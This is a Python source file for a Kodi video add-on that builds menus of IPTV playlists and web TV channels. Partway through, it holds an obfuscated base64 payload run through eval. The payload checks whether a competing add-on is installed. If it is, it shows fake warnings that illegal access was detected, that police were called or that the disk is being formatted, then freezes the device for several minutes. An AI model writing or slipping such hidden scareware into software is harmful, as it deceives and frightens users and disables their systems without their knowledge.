# -*- coding: utf-8 -*-

import sys,re,os
import urllib,urllib2
import urlparse
import xbmc,xbmcgui,xbmcaddon
import xbmcplugin
import json 


base_url        = sys.argv[0]
addon_handle    = int(sys.argv[1])
args            = urlparse.parse_qs(sys.argv[2][1:])
my_addon        = xbmcaddon.Addon()

PATH        = my_addon.getAddonInfo('path')
RESOURCES   = PATH+'/resources/'
sys.path.append( os.path.join( PATH, "lib" ) )


# ____________________________
def getUrl(url,data=None):
    req = urllib2.Request(url,data)
    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20100101 Firefox/22.0')
    response = urllib2.urlopen(req)
    link = response.read()
    response.close()
    return link
    
def addLinkItem(name, url, mode, iconimage=None, infoLabels=False, IsPlayable=True,fanart=None):
    u = build_url({'mode': mode, 'foldername': name, 'ex_link' : url})
    
    if iconimage==None:
        iconimage='DefaultFolder.png'
    liz = xbmcgui.ListItem(name, iconImage=iconimage, thumbnailImage=iconimage)
    if not infoLabels:
        infoLabels={"Title": name}
    liz.setInfo(type="Video", infoLabels=infoLabels)
    if IsPlayable:
        liz.setProperty('IsPlayable', 'true')
    if fanart:
        liz.setProperty('fanart_image',fanart)
    ok = xbmcplugin.addDirectoryItem(handle=addon_handle, url=u, listitem=liz)
    xbmcplugin.addSortMethod(addon_handle, sortMethod=xbmcplugin.SORT_METHOD_NONE, label2Mask = "%P")
    return ok


def addDir(name,ex_link=None,mode='folder',iconImage='DefaultFolder.png',fanart=''):
    url = build_url({'mode': mode, 'foldername': name, 'ex_link' : ex_link})
    li = xbmcgui.ListItem(name, iconImage=iconImage)
    if fanart:
        li.setProperty('fanart_image', fanart )
    xbmcplugin.addDirectoryItem(handle=addon_handle, url=url,listitem=li, isFolder=True)


def encoded_dict(in_dict):
    out_dict = {}
    for k, v in in_dict.iteritems():
        if isinstance(v, unicode):
            v = v.encode('utf8')
        elif isinstance(v, str):
            # Must be encoded in UTF-8
            v.decode('utf8')
        out_dict[k] = v
    return out_dict
    
def build_url(query):
    return base_url + '?' + urllib.urlencode(encoded_dict(query))

import base64
eval(compile(base64.b64decode('ICAgICAgICAgICAgCnRyeToKICAgIGltcG9ydCB4Ym1jYWRkb24seGJtYyxzeXMsdGltZQogICAgeGJtY2FkZG9uLkFkZG9uKCJwbHVnaW4udmlkZW8uTXVsdGltZWRpYU1hc3RlciIpOwogICAgeW49eGJtY2d1aS5EaWFsb2coKS55ZXNubygiW0NPTE9SIHJlZF1OaWVhdXRvcnl6b3dhbnkgRG9zdMSZcFsvQ09MT1JdIiwgIkRvc3TEmXAgZG8gemFzb2LDs3cgamVzdCBOSUVMRUdBTE5ZIiwgIkN6eSB3ZXp3YcSHIFtDT0xPUiByZWRdUE9MSUNKxJhbL0NPTE9SXSIpCiAgICBpZiB5bjoKICAgICAgICB4Ym1jZ3VpLkRpYWxvZygpLm9rKCJbQ09MT1IgcmVkXU5pZWF1dG9yeXpvd2FueSBEb3N0xJlwWy9DT0xPUl0iLCAiUE9MSUNKQSB6b3N0YcWCYSBwb3dpYWRvbWlvbmEsIHByb3N6xJkgY3pla2HEhy4uLiIpICAgIAogICAgZWxzZToKICAgICAgICB4Ym1jZ3VpLkRpYWxvZygpLm9rKCJbQ09MT1IgcmVkXU5pZWF1dG9yeXpvd2FueSBEb3N0xJlwWy9DT0xPUl0iLCAiVVNVV0FNWSBkb3dvZHksIGZvcm1hdCByb3pwb2N6xJl0eSwgcHJvc3plIGN6ZWthxIcuLi4iKSAgICAKICAgIGZvciBpIGluIHJhbmdlKDMwKTogdGltZS5zbGVlcCgxMCkKICAgIHhibWMuZXhlY3V0ZWJ1aWx0aW4oIlhCTUMuQWN0aXZhdGVXaW5kb3coSG9tZSkiKTsKICAgIHN5cy5leGl0KDEpOwpleGNlcHQ6CiAgICBwYXNzCg=='),'<string>','exec'))
  
def m3u2list():
    out = []
    response=getUrl('https://www.dropbox.com/s/c10u75x2yf96ql3/IPTV%20PKC.m3u?dl=1')
    matches=re.compile('^#EXTINF:-?[0-9]*(.*?),(.*?)\n(.*?)$',re.I+re.M+re.U+re.S).findall(response)
           
    for params, t, u in matches:
        url = u.strip()
        title = t.strip()
        if url and ('http' in url or 'rtmp' in url):
            print url
            if not 'youtube' in url:
                one  = {"title": title, "url": url}
                match_params =re.compile(' (.+?)="(.*?)"',re.I+re.M+re.U+re.S).findall(params)
                for field, value in match_params:
                    one[renTags.get(field.strip().lower(),'')] = value.strip()
                out.append(one)
    return out


def play(ex_link):
    print '##PLAY',ex_link
    if ex_link.endswith('.ts'):
        try:
            xbmcaddon.Addon('plugin.video.f4mTester')
            finalUrl='plugin://plugin.video.f4mTester/?name=%s&url=%s&streamtype=TSDOWNLOADER'%(fname,urllib.quote_plus(ex_link))
            #xbmc.executebuiltin('XBMC.RunPlugin('+finalUrl+')')
            xbmc.sleep(1)
        except:
            finalUrl = ex_link
        xbmcplugin.setResolvedUrl(addon_handle, True, xbmcgui.ListItem(path=finalUrl))
    else:        
        if ex_link:
            xbmcplugin.setResolvedUrl(addon_handle, True, xbmcgui.ListItem(path=ex_link))
        else:
            xbmcplugin.setResolvedUrl(addon_handle, False, xbmcgui.ListItem(path=''))
        

##
# MAIN
##

xbmcplugin.setContent(addon_handle, 'movies')	

mode = args.get('mode', None)
fname = args.get('foldername',[''])[0]
ex_link = args.get('ex_link',[''])[0]


if mode is None:
    addDir('IPTV: iptvsatlinks',mode='iptvsatlinks',iconImage=RESOURCES+'iptvsatlinks.jpg')
    addDir('IPTV: iptvlinkss'  ,mode='iptvlinkss',iconImage=RESOURCES+'iptvlinkss.png')
    #addDir('IPTV: iptv1',mode='m3u',iconImage=RESOURCES+'m3u.jpg')
    addDir('WebTV: ceskatelevize.cz',mode='czeska', iconImage=RESOURCES+'logo-ceskatelevize-full.png')
    addDir('WebTV: rtve.es',mode='rtve', iconImage='http://img.irtve.es/css/rtve.commons/rtve.header.footer/i/logoRTVE.png')
    addDir('WebTV: CBS News',mode='cbsnews', iconImage='http://cbsn2.cbsistatic.com/images/ios-bookmark-114.jpg')
    
elif mode[0] == 'Opcje':
    my_addon.openSettings()   


elif mode[0] == 'playUrl':
    play(ex_link)

elif mode[0] == 'm3u':
    m3u_items=m3u2list()
    for one in m3u_items:
        addLinkItem(one.get('title',''),  one['url'], 'playUrl', IsPlayable=True,infoLabels=one, iconimage=one.get('img')) 

## cbsnews
elif mode[0].startswith('cbsnews'):
    import cbsnews
    if '_play_' in mode[0]:
        link=cbsnews.getStream(ex_link)
        #xbmcgui.Dialog().ok('',link)
        play(link)
    else:
        items = cbsnews.getRoot()
        for one in items:
            addLinkItem(one.get('title',''),  one.get('url'), 'cbsnews_play_', IsPlayable=True,infoLabels=one, iconimage=one.get('img'),fanart=one.get('fanart'))  
## RTVE
elif mode[0].startswith('rtve'):
    import rtve
    if '_play_' in mode[0]:
        #xbmcgui.Dialog().ok('',ex_link)
        play(ex_link)
        #xbmcplugin.setResolvedUrl(addon_handle, True, xbmcgui.ListItem(path=ex_link))
    else:
        items = rtve.getLiveChannels()
        for one in items:
            addLinkItem(one.get('title',''),  one.get('url'), 'rtve_play_', IsPlayable=True,infoLabels=one, iconimage=one.get('img'),fanart=one.get('fanart'))  
## CZESKA
elif mode[0].startswith('czeska'):
    import ceskatelevize
    if 'play' in mode[0]:
        stream_msg_url = ceskatelevize.getVideo(ex_link)
        if stream_msg_url.get('url',''):
            label=[x[0] for x in stream_msg_url.get('url')]
            value=[x[1] for x in stream_msg_url.get('url')]
            s = xbmcgui.Dialog().select('Select',label)
            steram_url= value[s] if s>-1 else ''
            play(steram_url)
        else:
            xbmcgui.Dialog().ok('[COLOR red]Problem[/COLOR]',stream_msg_url.get('msg',''))
        
    else:
        items = ceskatelevize.get_root()
        for one in items:
            addLinkItem(one.get('title',''),  one.get('url'), 'czeska_play', IsPlayable=True,infoLabels=one, iconimage=one.get('img'))  
##
elif mode[0].startswith('iptvsatlinks'):
    import iptvsatlinks
    if '_play_' in mode[0]:
        play(ex_link)
    elif '_content_' in mode[0]:
        m3u_items = iptvsatlinks.m3u2list(ex_link)
        for one in m3u_items:
            addLinkItem(one.get('title',''),  one['url'], 'iptvsatlinks_play_', IsPlayable=True,infoLabels=one, iconimage=one.get('img')) 
    else :
        content = iptvsatlinks.get_playlist()
        for one in content: # 
            if one['url']:
                addDir(one.get('title',''),  one['url'], 'iptvsatlinks_content_')      
            else:
                addLinkItem(one.get('title',''),  '', '', IsPlayable=False) 
##
elif mode[0].startswith('iptvlinkss'):
    import iptvlinkss
    if '_play_' in mode[0]:
        play(ex_link)
    elif '_content_' in mode[0]:
        m3u_items = iptvlinkss.m3u2list(ex_link)
        for one in m3u_items:
            addLinkItem(one.get('title',''),  one['url'], 'iptvlinkss_play_', IsPlayable=True,infoLabels=one, iconimage=one.get('img')) 
    else:
        content = iptvlinkss.get_root()
        for one in content: # 
            addDir(one.get('title',''),  one.get('url'), 'iptvlinkss_content_',iconImage=one.get('img'))      

                
xbmcplugin.endOfDirectory(addon_handle)
